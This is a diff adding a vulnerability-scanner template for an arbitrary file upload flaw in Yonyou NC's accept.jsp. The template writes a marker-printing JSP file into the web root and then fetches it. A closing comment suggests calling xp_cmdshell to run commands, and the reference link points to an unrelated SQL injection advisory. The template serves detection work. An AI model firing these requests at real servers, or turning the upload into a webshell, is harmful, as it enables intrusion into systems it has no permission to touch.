@@ -1,0 +1,52 @@
+id: yonyou-nc-accept-arbitrary-file-upload
+
+info:
+  name: yonyou-nc-accept-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 用友NC在accept.jsp文件处存在任意文件上传漏洞。
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html
+  tags: yonyou
+
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+        Accept-Encoding: gzip
+
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"
+        Content-Type: text/plain
+
+        <% out.println("{{randstr_2}}"); %>
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="fname"
+
+        \webapps\nc_web\{{randstr_3}}.jsp
+        -----------------------------16314487820932200903769468567--
+
+      - |
+        GET /{{randstr_3}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
+        condition: and
+
+
+
+# 可尝试启动并调用xpcmdshell执行命令
